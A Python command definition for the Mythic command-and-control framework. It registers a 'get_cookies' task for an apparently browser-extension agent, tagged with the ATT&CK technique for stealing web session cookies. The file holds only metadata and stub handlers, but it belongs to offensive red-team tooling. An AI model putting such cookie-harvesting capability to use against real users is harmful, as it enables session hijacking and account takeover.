from mythic_container.MythicCommandBase import *


class GetCookiesArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        return


class GetCookiesCommand(CommandBase):
    cmd = "get_cookies"
    needs_admin = False
    help_cmd = "get_cookies"
    description = "Return cookies visible to the extension."
    version = 1
    author = "@kingofthenops"
    attackmapping = ["T1539"]
    argument_class = GetCookiesArguments
    supported_ui_features = ["browser_cookies:list"]
    browser_script = BrowserScript(
        script_name="get_cookies", author="@kingofthenops", for_new_ui=True
    )
    attributes = CommandAttributes(spawn_and_injectable=False)

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        return PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
            DisplayParams="",
        )

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
